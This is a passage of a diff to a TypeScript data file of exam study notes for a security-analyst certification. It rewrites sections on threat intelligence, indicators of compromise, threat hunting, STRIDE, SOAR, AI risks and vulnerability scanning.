         remember:
-          "Think of a weather forecast. If it arrives late (timeliness), is for another city (relevance), or is often wrong (accuracy), you will not trust it and will not plan around it. Intel works the same way.",
+          "A weather forecast. If it arrives after the storm (timeliness), is for a different city (relevance), or is often wrong (accuracy), you will not plan around it. Intel works the same way.",
         examTip:
-          "Match the problem to the factor. Old indicators that are no longer in use = timeliness. A report about a threat to an industry or technology you do not use = relevance. Many false positives or unverified claims = accuracy. Lower confidence means you should verify before acting.",
+          "Old indicators for infrastructure the attacker abandoned = timeliness problem. A report about a Linux-only threat when you run only Windows = relevance problem. Lots of false positives or unverified claims = accuracy problem. Low confidence means verify before you act, and do not auto-block on weak intel.",
       },
       {
         heading: "Collection Methods and Sources",
+        explain:
+          "Threat intelligence comes from public, private, and shared sources. Each has a different cost and trust level.",
         points: [
-          "Open-Source Intelligence (OSINT): Information collected from publicly available sources such as websites, social media, news reports, and public databases.",
-          "Closed-Source Intelligence: Information obtained from private, restricted, or subscription-based sources that are not publicly accessible.",
-          "Threat Intelligence Sharing: The exchange of threat information between organizations, vendors, and security communities to improve collective cybersecurity awareness.",
+          "Open-Source Intelligence (OSINT): Information from public sources such as news, social media, WHOIS, public databases, and paste sites.",
+          "Closed-source intelligence: Information from private, paid, or restricted sources, such as vendor subscriptions, dark-web monitoring, and government reports.",
+          "Threat intelligence sharing: Exchanging indicators with trusted groups, such as ISACs (industry sharing groups), or through platforms like MISP and OTX.",
         ],
         remember:
-          "OSINT = reading the public noticeboard. Closed-source = a paid private newsletter or a secret briefing. Sharing = neighbors telling each other which houses were burgled so everyone locks up.",
+          "OSINT = reading the public noticeboard. Closed-source = a paid private newsletter or secret briefing. Sharing = neighbors telling each other which houses were burgled so everyone locks up.",
         examTip:
-          "Free and public (news, social media, WHOIS, public databases) = OSINT. Paid feeds, vendor subscriptions, or restricted government reports = closed-source. Industry groups exchanging indicators (like ISACs, or tools like MISP and OTX) = threat intelligence sharing.",
+          "Free and public (news, social media, WHOIS) = OSINT. Paid feeds or restricted reports = closed-source. Industry group exchanging indicators (an ISAC, MISP, OTX) = threat intelligence sharing. OSINT is cheap but must be verified; shared intel is only as good as its relevance to you.",
       },
       {
-        heading: "Indicator of Compromise (IoC)",
+        heading: "Indicators of Compromise (IoC): Lifecycle",
+        explain:
+          "An IoC is evidence that a system may be compromised. Using IoCs well means collecting, analyzing, and then applying them.",
         points: [
-          "Collection: The process of gathering evidence such as suspicious files, IP addresses, domains, or logs that may indicate an attack.",
-          "Analysis: The examination of collected indicators to determine whether malicious activity has occurred or is occurring.",
-          "Application/Usage: The use of indicators within security tools and processes to detect, monitor, block, or investigate threats.",
+          "Collection: Gathering indicators from logs, incident response, threat feeds, and sharing communities.",
+          "Analysis: Checking whether indicators are really malicious and relevant, using tools such as VirusTotal and AbuseIPDB, and removing duplicates and false positives.",
+          "Application and usage: Loading validated indicators into the SIEM, firewall, EDR, or DNS filters to detect, alert, or block, and to hunt for past activity.",
         ],
         remember:
-          "IoCs are fingerprints and footprints at a crime scene. First collect them (gather the prints), then analyze them (do they match a known criminal?), then apply them (put the suspect on the watchlist in your SIEM, firewall, or EDR).",
+          "IoCs are fingerprints at a crime scene. First collect the prints, then analyze them (do they match a known criminal?), then put the suspect on the watchlist in your SIEM, firewall, or EDR.",
         examTip:
-          "Follow the order: collect, analyze, apply. Gathering hashes and IPs from logs = collection. Checking whether they are really malicious (VirusTotal, AbuseIPDB) = analysis. Loading them into the SIEM, firewall, or EDR to block or alert = application. Skipping analysis can cause false positives.",
+          "Follow the order: collect, analyze, apply. Gathering hashes and IPs from logs = collection. Checking whether they are really malicious = analysis. Loading them into the SIEM or firewall = application. Skipping analysis causes false positives and can block legitimate services.",
       },
       {
         heading: "Types of IoCs",
+        explain:
+          "IoCs come in two broad types. One is a single clue, the other is a pattern.",
         points: [
-          "Atomic: A single piece of observable evidence, such as an IP address, file hash, domain name, or email address, that may indicate malicious activity.",
-          "Behavioral: A pattern of activity or attacker behavior that suggests malicious intent, such as repeated failed login attempts or unusual data transfers.",
+          "Atomic: A single observable value that cannot be broken down, such as an IP address, domain, file hash, or email address.",
+          "Behavioral: A pattern of activity that suggests malicious intent, such as many failed logins then a success, Word launching PowerShell, or large night-time uploads.",
         ],
         remember:
-          'Atomic = a single clue, like one fingerprint. Behavioral = a pattern, like "this person always checks the cameras, then picks the lock, then leaves at 3 AM." A fingerprint is easy to change, but a habit is hard to hide.',
+          "Atomic is one fingerprint. Behavioral is a habit: 'this person always checks the cameras, picks the lock, and leaves at 3 AM.' A fingerprint is easy to change, but a habit is hard to hide.",
         examTip:
-          "A single value you can copy and paste (IP, hash, domain, email address) = atomic. A sequence or pattern (many failed logins then a success, Word spawning PowerShell, large night-time uploads) = behavioral. Behavioral IoCs sit higher on the Pyramid of Pain and last longer.",
+          "A single value you can copy and paste (IP, hash, domain, email) = atomic. A sequence or pattern of actions = behavioral. Behavioral indicators are higher on the Pyramid of Pain, last longer, and are harder for the attacker to change, but they are harder to write detections for.",
+      },
+      {
+        heading: "Threat Hunting",
+        explain:
+          "Hunting is a proactive search for threats that automated tools did not alert on.",
+        points: [
+          "Hypothesis-driven: The hunter starts with an idea, for example 'an attacker may be using scheduled tasks for persistence', and searches the data for it.",
+          "Sources: Threat intelligence, ATT&CK techniques, and anomalies found through the SIEM, EDR, or UEBA.",
+          "Outcome: Either a confirmed incident, a new detection rule, a closed visibility gap, or a documented 'nothing found'.",
+        ],
+        remember:
+          "Alerts are the smoke alarm that rings when there is smoke. Hunting is the inspector walking through the building looking for wiring that could start a fire before any alarm goes off.",
+        examTip:
+          "Proactive search assuming a breach already happened = threat hunting. Start from a hypothesis, intelligence, or an ATT&CK technique. A successful hunt often ends by turning the finding into a new detection rule or playbook, which feeds back into efficiency (Module 1.5).",
       },
       {
         heading: "Threat Modeling (STRIDE)",
+        explain:
+          "STRIDE is a checklist for finding what could go wrong with a system. Each letter is a type of threat.",
         points: [
-          "Spoofing: An attacker pretends to be a legitimate user, device, or system to gain unauthorized access.",
-          "Tampering: An attacker modifies data, files, configurations, or software without authorization.",
-          "Repudiation: A user performs an action and later denies carrying out that action because there is insufficient evidence to prove it.",
-          "Information Disclosure: Sensitive information is exposed to individuals who are not authorized to access it.",
-          "Denial of Service (DoS): An attacker overwhelms a system or service to make it unavailable to legitimate users.",
-          "Elevation of Privilege: An attacker gains permissions or access rights beyond those originally granted.",
+          "Spoofing: Pretending to be someone or something else (violates authentication).",
+          "Tampering: Modifying data, code, or configuration without permission (violates integrity).",
+          "Repudiation: Denying an action when there is no proof (violates non-repudiation).",
+          "Information disclosure: Exposing data to people who should not see it (violates confidentiality).",
+          "Denial of service: Making a service unavailable (violates availability).",
+          "Elevation of privilege: Gaining more rights than allowed (violates authorization).",
         ],
         remember:
-          'Match each letter to a simple story. S = wearing a fake name tag. T = changing the numbers in the ledger. R = "it was not me" with no proof. I = a secret left on the open table. D = a crowd blocking the shop door. E = a visitor walking into the manager\'s office.',
+          "S = a fake name tag. T = changing the numbers in the ledger. R = 'it was not me' with no proof. I = a secret left on the open table. D = a crowd blocking the shop door. E = a visitor walking into the manager's office.",
         examTip:
-          "Match the scenario. Fake login or forged email sender = spoofing. Altered file or database record = tampering. User denies an action and there are no logs = repudiation (fix with logging and digital signatures). Data leak or exposed records = information disclosure. Service flooded = DoS. Normal user gains admin rights = elevation of privilege.",
+          "Forged login or spoofed email sender = Spoofing. Altered file or database record = Tampering. User denies an action and there are no logs = Repudiation (fix with logging and digital signatures). Data leak = Information disclosure. Flooded service = DoS. Normal user becomes admin = Elevation of privilege.",
       },
       {
         heading: "Threat Mapping",
+        explain:
+          "Threat mapping links threats and techniques to your own assets and controls so you can see where you are exposed.",
         points: [
-          "Threat Mapping: The process of associating known threats, attack techniques, vulnerabilities, and security controls to understand how attackers may target an environment.",
+          "Threat mapping: Associating known threats, attack techniques (often ATT&CK), vulnerabilities, and your security controls to find coverage gaps.",
+          "Result: A prioritized view of where to add detection or protection first.",
         ],
         remember:
-          "Threat mapping is a treasure map in reverse. You draw where the attacker could go (threats and techniques), then mark where your guards are (controls). Any path with no guard is a gap you need to fix.",
+          "A treasure map in reverse. You draw every path an attacker could take (threats and techniques), then mark where your guards stand (controls). Any path with no guard is a gap to fix.",
         examTip:
-          "Linking known threats and techniques (often using MITRE ATT&CK) to your assets, vulnerabilities, and controls to find coverage gaps = threat mapping. The goal is to decide where to add detection or protection first.",
+          "Linking techniques used by relevant threat actors to your assets and the controls that cover them = threat mapping. The goal is to decide which gap to close first. Pair it with a heat map to show covered and uncovered techniques.",
       },
       {
         heading: "Cyber Deception",
+        explain:
+          "Deception places bait where only an intruder would touch it. Any interaction is suspicious, which gives high-confidence alerts.",
         points: [
-          "Cyber Deception: A security technique that uses fake systems, files, credentials, or services to lure attackers and observe their activities without exposing real assets.",
-          "Honeypot: A decoy system designed to attract attackers and capture information about their methods and activities.",
-          "Honeynet: A network of multiple connected honeypots created to simulate a realistic environment for observing attacker behavior.",
-          "Decoy Assets: Fake files, databases, servers, or accounts intentionally placed within an environment to detect unauthorized access attempts.",
-          "Fake Credentials: False usernames, passwords, API keys, or tokens planted in systems to alert security teams when attackers attempt to use them.",
+          "Honeypot: A decoy system designed to attract attackers and record what they do.",
+          "Honeynet: A network of multiple honeypots simulating a realistic environment.",
+          "Decoy assets: Fake files, databases, or servers placed in the environment to detect unauthorized access.",
+          "Honeytoken and fake credentials: Fake accounts, passwords, API keys, or records that no legitimate user should ever use. Use triggers an alert.",
         ],
         remember:
-          "Cyber deception is bait in a trap. A honeypot = a fake jar of honey that attracts the bear. A honeynet = a whole fake village. Fake credentials = a planted wallet with a tracker inside. No real employee should ever touch it, so if anyone does, you know it is an intruder.",
+          "Bait in a trap. A honeypot is a fake jar of honey that attracts the bear. A honeynet is a whole fake village. A honeytoken is a planted wallet with a tracker inside. No real employee should touch it, so anyone who does is an intruder.",
         examTip:
-          "A single decoy system = honeypot. A network of decoys = honeynet. Fake files or credentials that should never be used = honeytokens. Any interaction with a decoy is suspicious, which gives high-confidence alerts with very few false positives. It also lets you study attacker behavior safely.",
+          "One decoy system = honeypot. A network of decoys = honeynet. A fake credential, file, or record that should never be used = honeytoken. Any interaction with a decoy is suspicious, so alerts have very few false positives and you can study attacker behavior safely. Isolate decoys so they cannot be used to attack real systems.",
       },
     ],
   },
@@ -850,59 +1044,68 @@ export const studyNotes: StudyNote[] = [
     module: "1.5",
     moduleName: "Efficiency and Process Improvement",
     description:
-      "Playbooks and runbooks, SOAR and automation, infrastructure as code, data enrichment, alert tuning, dashboards, APIs, webhooks and plug-ins.",
-    lastUpdated: "Oct 9, 2026",
+      "Playbooks and runbooks, SOAR and automation, infrastructure as code, data enrichment, alert tuning, dashboards, APIs, webhooks, and plug-ins.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Workflow,
-    estimatedTime: "1.1 hours",
+    estimatedTime: "65 minutes",
     sections: [
       {
         heading: "Standardize Processes",
+        explain:
+          "When every analyst handles incidents differently, results are inconsistent and slow. Standard documents fix that.",
         points: [
-          "Manage and Facilitate Team Coordination: A standardized process ensures that all security team members follow the same procedures, improving communication, consistency, and incident response effectiveness.",
-          "Playbook Creation: A playbook is a documented set of step-by-step instructions that guides security teams on how to respond to specific security events or incidents.",
-          "Runbook Creation: A runbook is a detailed operational guide that outlines the exact actions required to perform routine security tasks or resolve specific issues.",
+          "Team coordination: Standard procedures make sure everyone follows the same steps, speak the same language, and hand over work cleanly.",
+          "Playbook: A documented, scenario-level plan for responding to a type of event (phishing, ransomware, data breach), including decisions and roles.",
+          "Runbook: Detailed, step-by-step technical instructions for a specific routine task (isolate a host, block an IP, reset a password).",
         ],
         remember:
-          'Think of a sports team. The playbook = the game plan for a situation ("if we get a phishing report, here is how we respond"). The runbook = the detailed instructions for one move ("how to reset a password or isolate a host, click by click"). When everyone follows the same plan, nobody improvises under pressure.',
+          "A sports team. The playbook is the game plan for a situation ('if we get a phishing report, here is how we respond'). The runbook is the exact instructions for one move ('how to isolate a host, click by click'). When everyone follows the same plan, nobody improvises under pressure.",
         examTip:
-          "Responding to a specific type of incident (ransomware, phishing, data breach) with defined steps and roles = playbook. Detailed technical steps for a routine task (isolating a host, blocking an IP) = runbook. New analysts doing things differently each time, or inconsistent responses = standardize with playbooks and runbooks.",
+          "Responding to a TYPE of incident with defined steps and roles = playbook. Detailed technical steps for ONE routine task = runbook. New analysts handle the same alert differently each time = standardize with playbooks and runbooks. Playbook = what and who; runbook = exactly how.",
       },
       {
-        heading: "Streamline Operations",
+        heading: "Automation and Orchestration",
+        explain:
+          "Automating routine work frees analysts for decisions and cuts response time.",
         points: [
-          "Automation and Orchestration: Automation and orchestration reduce manual effort by allowing security tools and processes to work together automatically to detect, investigate, and respond to threats.",
-          "Security Orchestration, Automation, and Response (SOAR): SOAR is a technology platform that integrates security tools and automates incident response workflows to improve security operations efficiency.",
-          "Infrastructure as Code (IaC): Infrastructure as Code is the practice of managing and provisioning infrastructure through code instead of manual configuration, ensuring consistency and reducing human error.",
+          "Automation: One tool performing a task automatically (for example auto-blocking a bad IP).",
+          "Orchestration: Coordinating many tools and steps into one workflow (alert, enrich, open ticket, notify, block).",
+          "Security Orchestration, Automation, and Response (SOAR): A platform that connects security tools and runs automated workflows, usually triggered by playbooks.",
+          "Infrastructure as Code (IaC): Defining and deploying infrastructure from code (for example Terraform) so environments are consistent, repeatable, and reviewable. Scanners like Checkov can check IaC before deployment.",
         ],
         remember:
-          "Think of a kitchen. Automation = one machine doing one job (a dishwasher). Orchestration = the head chef coordinating all machines and cooks so the meal comes out together. SOAR = that head chef for your security tools. IaC = a written recipe, so every kitchen you open comes out identical.",
+          "A kitchen. Automation = one machine doing one job (a dishwasher). Orchestration = the head chef coordinating all machines and cooks so the meal comes out together. SOAR = that head chef for your security tools. IaC = a written recipe, so every kitchen you open comes out identical.",
         examTip:
-          "One task done automatically (auto-block an IP) = automation. Many tools working together in one workflow (alert, enrich, ticket, block) = orchestration, usually through SOAR. Reduce analyst workload or response time = SOAR. Build identical, repeatable environments and avoid manual misconfiguration = IaC (like Terraform).",
+          "One task done automatically = automation. Many tools working together in one workflow = orchestration, usually through SOAR. Reduce analyst workload and response time = SOAR. Build identical, repeatable environments and avoid manual misconfiguration = IaC. Automate low-risk, repeatable steps and keep a human approval for high-impact actions like isolating a production server.",
       },
       {
-        heading: "Data Enrichment",
+        heading: "Data Enrichment, Alert Tuning, and Dashboards",
+        explain:
+          "Raw alerts lack context and create noise. Enrichment adds meaning, tuning removes noise, and dashboards show the big picture.",
         points: [
-          "Data Enrichment: Data enrichment is the process of adding additional context and information to security data to improve analysis and decision-making.",
-          "Rule/Alert Tuning: Rule or alert tuning is the process of adjusting detection rules to reduce false positives and improve the accuracy of security alerts.",
-          "Dashboard Creation: Dashboard creation involves building visual displays that present security metrics, alerts, and system activity in an easy-to-understand format for analysts.",
+          "Data enrichment: Adding context to data, such as GEO-IP, IP reputation, asset owner, user role, or vulnerability status.",
+          "Rule and alert tuning: Adjusting thresholds, adding exceptions, and refining logic to reduce false positives while still catching real attacks.",
+          "Dashboard creation: Building visual summaries of alerts, trends, and metrics for analysts or management.",
         ],
         remember:
-          'Enrichment = a bare IP address is just a number, but add "owned by a hosting company, reported 50 times, in a country we never use" and it becomes a story. Tuning = adjusting a smoke alarm so toast does not set it off. Dashboard = the car dashboard: speed and warning lights at a glance.',
+          "A bare IP address is just a number, but add 'owned by a hosting company, reported 50 times, in a country we never use' and it becomes a story (enrichment). Tuning is adjusting a smoke alarm so toast does not set it off. A dashboard is the car dashboard: speed and warning lights at a glance.",
         examTip:
-          "Adding context like GeoIP, reputation, or asset owner to an alert = enrichment. Too many false positives or alert fatigue = tune the rules (adjust thresholds, add exceptions), but do not simply turn the alert off. Need a quick visual of metrics or trends for analysts or management = dashboard.",
+          "Adding GeoIP, reputation, or asset owner to an alert = enrichment. Too many false positives or alert fatigue = tune the rule (thresholds, exceptions); do not simply turn it off. Quick visual of metrics or trends = dashboard. Over-tuning can create false negatives, so test changes.",
       },
       {
         heading: "Technology and Tool Integration",
+        explain:
+          "Security tools are most powerful when they talk to each other. APIs, webhooks, and plug-ins are the connectors.",
         points: [
-          "APIs (Application Programming Interfaces): APIs allow different security tools and applications to communicate and exchange data automatically.",
-          "Webhooks: Webhooks are automated notifications that send information between systems when a specific event occurs.",
-          "Plug-ins: Plug-ins are software extensions that add new features or functionality to existing security tools and platforms.",
+          "APIs: Interfaces that let one tool request data from, or send commands to, another. The caller asks and the other tool answers (pull).",
+          "Webhooks: Automatic notifications sent when an event happens, so the other system is pushed the data immediately (push).",
+          "Plug-ins: Extensions that add features or integrations to an existing tool, such as a threat-feed connector for a SIEM.",
         ],
         remember:
-          'API = you call the restaurant and ask "what is on the menu?" (you request, they answer). Webhook = the restaurant texts you when your table is ready (it pushes to you when something happens). Plug-in = a new attachment you snap onto a tool you already own.',
+          "An API is you phoning the restaurant to ask what is on the menu (you ask, they answer). A webhook is the restaurant texting you the moment your table is ready (they notify you). A plug-in is a new attachment you snap onto a tool you already own.",
         examTip:
-          "One tool pulling data from or sending commands to another on request = API. A system automatically notifying another the moment an event happens (a new alert triggers a Slack message or SOAR workflow) = webhook. Adding a feature to an existing tool, like a SIEM connector for a threat feed = plug-in. Pull = API, push = webhook.",
+          "Pull data or send a command on request = API. Notify automatically when an event happens (a new alert triggers a Slack message or SOAR workflow) = webhook. Add a feature or connector to an existing tool = plug-in. Pull = API, push = webhook. Protect API keys and tokens used for integrations.",
       },
     ],
   },
@@ -914,55 +1117,60 @@ export const studyNotes: StudyNote[] = [
     module: "1.6",
     moduleName: "AI in Security Operations",
     description:
-      "AI risks such as hallucinations, data exposure, model poisoning and malicious prompts, plus governance and practical use cases for analysts.",
-    lastUpdated: "Oct 9, 2026",
+      "AI risks such as hallucinations, data exposure, model poisoning, and malicious prompts, plus governance and practical use cases for analysts.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Bot,
-    estimatedTime: "1.5 hours",
+    estimatedTime: "60 minutes",
     sections: [
       {
         heading: "AI Risks",
+        explain:
+          "AI can speed analysts up, but it can also be wrong, leak data, or be manipulated. You must know the four risks the exam names.",
         points: [
-          "Hallucinations: Hallucinations occur when an AI system generates incorrect, misleading, or completely fabricated information while presenting it as if it were accurate.",
-          "Data Exposure: Data exposure occurs when sensitive, confidential, or proprietary information is unintentionally shared with or through an AI system.",
-          "Model Poisoning: Model poisoning is an attack where malicious data is intentionally inserted into AI training data to influence the model's behavior and produce inaccurate or harmful results.",
-          "Malicious Prompts: Malicious prompts are specially crafted inputs designed to manipulate an AI system into revealing sensitive information, bypassing restrictions, or producing unintended outputs.",
+          "Hallucinations: The AI produces confident but false output, such as an invented CVE, IP address, or command.",
+          "Data exposure: Sensitive or proprietary data entered into an AI tool is stored, shared, or used for training outside your control.",
+          "Model poisoning: An attacker corrupts the training data so the model behaves incorrectly or carries a hidden weakness.",
+          "Malicious prompts: Crafted inputs (prompt injection or jailbreaks) that trick an AI into ignoring its rules, revealing data, or taking unwanted actions.",
         ],
         remember:
-          "Think of AI as a very confident new intern. Hallucination = the intern makes up an answer instead of admitting they do not know. Data exposure = the intern accidentally shares company secrets with outsiders. Model poisoning = someone slipped fake facts into the intern's textbook. Malicious prompt = a stranger sweet-talking the intern into breaking the rules.",
+          "AI is a very confident new intern. Hallucination = the intern makes up an answer instead of admitting they do not know. Data exposure = the intern accidentally shares company secrets with outsiders. Model poisoning = someone slipped fake facts into the intern's textbook. Malicious prompt = a stranger sweet-talking the intern into breaking the rules.",
         examTip:
-          "Match the scenario. AI gives a confident answer with a fake source, IP, or CVE = hallucination (always verify). Analyst pastes customer data or source code into a public AI tool = data exposure. Attacker corrupts the training data so the model behaves wrongly = model poisoning. Crafted input that tricks the AI into ignoring its rules or leaking data (prompt injection) = malicious prompt.",
+          "AI gives a confident answer with a fake source, IP, or CVE = hallucination (always verify). Analyst pastes customer data or source code into a public AI tool = data exposure. Attacker corrupts the training data = model poisoning (happens before or during training). Crafted input that tricks the AI at run time = malicious prompt. Poisoning attacks the TRAINING; malicious prompts attack the RUNNING model.",
       },
       {
         heading: "Governance",
+        explain:
+          "Governance is the rulebook for using AI at work, so benefits are gained without breaking laws or leaking data.",
         points: [
-          "Legal or Regulatory Compliance: Organizations must ensure that AI systems follow applicable laws, regulations, and industry standards related to privacy, security, and data protection.",
-          "AI Usage Policies: AI usage policies are documented rules and guidelines that define how AI technologies should be used safely, responsibly, and ethically within an organization.",
+          "Legal or regulatory compliance: AI use must follow laws and standards on privacy and data protection (for example GDPR, HIPAA), including where data is processed and stored.",
+          "AI usage policies: Written rules covering approved tools, what data may be entered, who reviews the output, and how use is logged and monitored.",
         ],
         remember:
-          "Governance is the rulebook for using AI at work. Compliance = obeying the law of the land (privacy and data protection rules like GDPR or HIPAA). Usage policy = your company's house rules: which tools are approved, what data may go in, and who checks the output.",
+          "Compliance = obeying the law of the land. Usage policy = your company's house rules: which AI tools are approved, what data may go in, and who checks the output.",
         examTip:
-          "Staff using unapproved AI tools or pasting sensitive data into them = the fix is an AI usage policy (approved tools, data handling rules, training). Concern about privacy laws or where data is stored = legal and regulatory compliance. Governance answers usually involve policy, approval, and human review, not banning AI completely.",
+          "Staff pasting sensitive data into unapproved AI tools = the fix is an AI usage policy (approved tools, data rules, training) plus controls such as DLP. Concern about privacy laws or where data is stored = legal and regulatory compliance. Good governance answers involve policy, approval, and human review, not banning AI completely.",
       },
       {
         heading: "Use Cases",
+        explain:
+          "AI is best at processing large volumes and drafting. The analyst stays responsible for decisions.",
         points: [
-          "Comparing Artifacts: AI can analyze and compare files, logs, malware samples, hashes, or other security artifacts to identify similarities, differences, and indicators of compromise.",
-          "Analyzing Log Files: AI can process large volumes of log data to identify suspicious activities, anomalies, and potential security incidents more quickly than manual analysis.",
-          "Document Creation: AI can assist in creating security reports, incident summaries, policies, procedures, and other documentation based on available data.",
-          "Incident Investigation: AI can help security analysts investigate incidents by identifying patterns, correlating evidence, and suggesting possible causes or attack paths.",
-          "Event Correlation: AI can correlate events from multiple security tools and data sources to identify relationships that may indicate a coordinated attack or security incident.",
-          "Automation and Orchestration: AI can automate repetitive security tasks and coordinate actions across multiple security tools to improve response times and operational efficiency.",
+          "Comparing artifacts: Finding similarities and differences between files, scripts, samples, or hashes.",
+          "Analyzing log files: Summarizing huge logs and spotting anomalies faster than manual review.",
+          "Document creation: Drafting reports, incident summaries, policies, and procedures.",
+          "Incident investigation: Suggesting patterns, possible causes, and attack paths from evidence.",
+          "Event correlation: Linking events from different tools into one story.",
+          "Automation and orchestration: Automating repetitive steps and coordinating tools to speed response.",
         ],
         remember:
-          "AI is a tireless assistant that never gets bored of reading. It can scan a million log lines, spot which files look alike, connect clues from different tools, and draft the report, so the human analyst can focus on decisions. The assistant helps, but the analyst stays in charge.",
+          "AI is a tireless assistant that never gets bored of reading. It can scan a million log lines, spot which files look alike, and draft the report, so the human can focus on decisions. The assistant helps; the analyst stays in charge.",
         examTip:
-          "Best-fit AI tasks: reading huge volumes of logs, comparing files or hashes, correlating events across tools, drafting incident reports, and automating repetitive steps. The safe answer always keeps a human in the loop: AI suggests, the analyst verifies. Be wary of answers that let AI make final decisions or handle sensitive data without controls.",
+          "Best-fit AI tasks: reading huge volumes of logs, comparing artifacts, correlating events, drafting reports, and automating repetitive steps. The safe answer keeps a human in the loop: AI suggests, the analyst verifies. Be wary of answers where AI makes final decisions alone or handles sensitive data without controls.",
       },
     ],
   },
-
-  // Domain 2.0: Vulnerability Management (26%)
+  // ===================== DOMAIN 2.0 VULNERABILITY MANAGEMENT (26%) =====================
   {
     id: "domain-2-1",
     title: "Vulnerability Discovery and Scanning",
@@ -971,1107 +1179,1075 @@ export const studyNotes: StudyNote[] = [
     module: "2.1",
     moduleName: "Vulnerability Discovery",
     description:
-      "Asset inventory, planning considerations, scan types (internal vs external, agent vs agentless, credentialed vs non-credentialed, passive vs active), discovery scanning, and security baseline scanning.",
-    lastUpdated: "Oct 13, 2026",
+      "Asset inventory, planning considerations, scan types (passive vs active, internal vs external, agent vs agentless, credentialed vs non-credentialed), discovery scanning, and security baseline scanning.",
+    lastUpdated: "2026-10-19",
     access: "Free",
-    icon: Search,
-    estimatedTime: "1.2 hours",
+    icon: Crosshair,
+    estimatedTime: "75 minutes",
     sections: [
       {
         heading: "Asset Inventory",
         explain:
-          "Asset inventory is the foundation of any vulnerability scanning program. Before you can scan, you must know what you have.",
+          "Asset inventory is the foundation of vulnerability management. You cannot scan or protect what you do not know you have.",
         points: [
-          "Process of identifying, documenting, and maintaining a list of all devices, systems, applications, and resources within an organization's environment.",
-          "Must be completed before performing vulnerability scans to ensure comprehensive coverage.",
-          "Includes hardware, software, cloud resources, IoT devices, and infrastructure components.",
-          "Regularly updated to reflect changes in the environment and new acquisitions.",
+          "Asset inventory: A maintained list of all devices, systems, applications, cloud resources, IoT devices, and infrastructure.",
+          "Timing: The inventory must exist before scanning so scans cover everything that matters.",
+          "Maintenance: The inventory must be updated regularly as systems are added, changed, or retired.",
+          "Shadow IT: Systems or cloud services used without IT knowledge, which are missing from the inventory and so never scanned.",
         ],
         remember:
-          "Think of a teacher taking attendance. If a student is not on the list, nobody notices when they go missing. An asset missing from the inventory never gets scanned, so its vulnerabilities stay hidden. Inventory first, scanning second.",
+          "A teacher taking attendance. If a student is not on the list, nobody notices when they go missing. An asset missing from the inventory never gets scanned, so its vulnerabilities stay hidden. Inventory first, scanning second.",
         examTip:
-          "Scan results look incomplete, or a breach came through a server nobody knew about (shadow IT, forgotten cloud instance, unmanaged IoT device) = the root cause is an incomplete asset inventory. The fix is to discover and document assets, then keep the list updated.",
+          "Scan results look incomplete, or a breach came through a server nobody knew about (shadow IT, a forgotten cloud instance, an unmanaged IoT device) = the root cause is an incomplete asset inventory. The fix is to discover and document assets, then keep the list updated. Discovery scans feed the inventory.",
       },
       {
         heading: "Planning Considerations",
         explain:
-          "Successful vulnerability scanning requires careful planning and coordination.",
+          "A scan that crashes a production system is a self-inflicted incident. Good planning protects the business.",
         points: [
-          "Scheduling: Determine when scans should run to minimize disruptions and ensure systems are regularly assessed. Critical systems may need daily scans, while less critical systems weekly or monthly.",
-          "Operations: Ensure scanning activities do not negatively affect normal business processes or critical services. Coordinate with operations teams.",
-          "Performance: Evaluate how scanning might impact system resources, network bandwidth, and application responsiveness. Heavy scans may cause noticeable slowdown.",
-          "Sensitivity Levels: Classify systems and data so scanning activities are conducted according to importance and risk. High-sensitivity systems may need different scan parameters.",
-          "Segmentation: Divide networks into separate sections so scans can be targeted more effectively and reduce security risks. Allows focused scanning by risk level.",
-          "Regulatory Requirements: Comply with standards like PCI-DSS, HIPAA, and SOC 2 that mandate how and when vulnerability assessments must be performed.",
+          "Scheduling: Choose when scans run to reduce disruption. Critical systems may be scanned more often.",
+          "Operations: Make sure scanning does not interrupt business processes. Coordinate with the operations team.",
+          "Performance: Scans use CPU, memory, and bandwidth. Heavy scans can slow systems and networks.",
+          "Sensitivity levels: Classify systems and data so scan settings fit the importance and fragility of each.",
+          "Segmentation: Scan network zones separately, with scanners placed so they can reach each zone.",
+          "Regulatory requirements: Standards decide how and how often to scan. PCI DSS requires internal and external scans at least quarterly, with external scans by an Approved Scanning Vendor. HIPAA requires regular risk analysis.",
         ],
         remember:
-          "Think of a building inspection. You do not inspect the hospital during surgery. You pick the right time (scheduling), avoid disturbing the patients (operations and performance), treat the operating room differently from the lobby (sensitivity), inspect one wing at a time (segmentation), and follow the inspector's rulebook (regulations).",
+          "A building inspection. You do not inspect the hospital during surgery. Pick the right time (scheduling), avoid disturbing patients (operations and performance), treat the operating room differently from the lobby (sensitivity), inspect one wing at a time (segmentation), and follow the inspector's rulebook (regulations).",
         examTip:
-          "Match the clue. Scan slows down a production app = performance or operations, so reschedule to off-hours or lower the intensity. Payment card data = PCI DSS. Patient data = HIPAA. Different zones with different risk = segmentation. Always coordinate with the operations team before scanning critical or fragile systems like OT.",
+          "Scan slows a production app = performance or operations: reschedule to off-hours or lower the intensity. Payment card data = PCI DSS. Patient data = HIPAA. Zones with different risk = segmentation (and a scanner in each zone). Always coordinate with the operations team before scanning fragile or critical systems such as OT.",
       },
       {
-        heading: "Scan Types - Passive vs Active",
+        heading: "Scan Types: Passive vs Active",
         explain:
-          "Vulnerability scanning can be either passive (observation only) or active (sending test traffic).",
+          "Passive scanning only observes. Active scanning interacts with targets, so it finds more but carries more risk.",
         points: [
-          "Passive Scan: Monitors network traffic and system activity without directly interacting with target systems. Lower risk but limited findings.",
-          "Active Scan: Directly communicates with target systems by sending probes and requests to identify vulnerabilities. More comprehensive but higher risk to stability.",
-          "Passive: WHOIS lookups, banner grabbing, traffic analysis. Safe for production.",
-          "Active: Port scanning, service enumeration, exploit testing. May cause performance impact.",
+          "Passive scan: Monitors network traffic and system activity without sending probes. It is low risk but can only see what happens to pass by.",
+          "Active scan: Sends probes and requests to targets to find vulnerabilities. It is more complete but can affect performance or stability.",
+          "Passive examples: Sniffing or monitoring traffic, reviewing logs, passive asset discovery, and OSINT.",
+          "Active examples: Port scanning, banner grabbing, service enumeration, and vulnerability probes.",
         ],
         remember:
-          "Passive = a bird watcher with binoculars. You observe from a distance and never disturb anything. Active = a doctor checking reflexes. You touch the patient to get better answers, but you might cause a reaction.",
+          "Passive is a bird watcher with binoculars: you observe from a distance and never disturb anything. Active is a doctor checking reflexes: you touch the patient to get better answers, but you might cause a reaction.",
         examTip:
-          "Fragile or business-critical system, or you cannot risk disruption = passive. Need the most complete and accurate results = active, ideally in a maintenance window. Probes sent, ports scanned, or services touched = active. Only watching traffic = passive.",
